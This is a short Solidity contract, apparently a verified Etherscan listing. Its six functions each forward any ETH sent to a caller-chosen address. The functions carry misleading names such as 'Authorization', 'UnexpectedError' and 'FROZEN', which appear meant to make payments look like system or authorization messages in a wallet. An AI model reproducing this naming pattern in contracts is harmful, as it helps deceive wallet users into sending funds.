/**
 *Submitted for verification at Etherscan.io on 2021-11-18
*/

/**

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract EthWithdraw {

    function Auction(address payable recepient) public payable {
        uint256 amount = msg.value;
        recepient.transfer(amount);

    }

    function Authorization(address payable recepient) public payable {
        uint256 amount = msg.value;
        recepient.transfer(amount);

    }

    function AuthorisationError(address payable recepient) public payable {
        uint256 amount = msg.value;
        recepient.transfer(amount);

    }


    function UnexpectedError(address payable recepient) public payable {
        uint256 amount = msg.value;
        recepient.transfer(amount);

    }

    function ReservedByTheSystem(address payable recepient) public payable {
        uint256 amount = msg.value;
        recepient.transfer(amount);

    }

    function FROZEN(address payable recepient) public payable {
        uint256 amount = msg.value;
        recepient.transfer(amount);

    }


}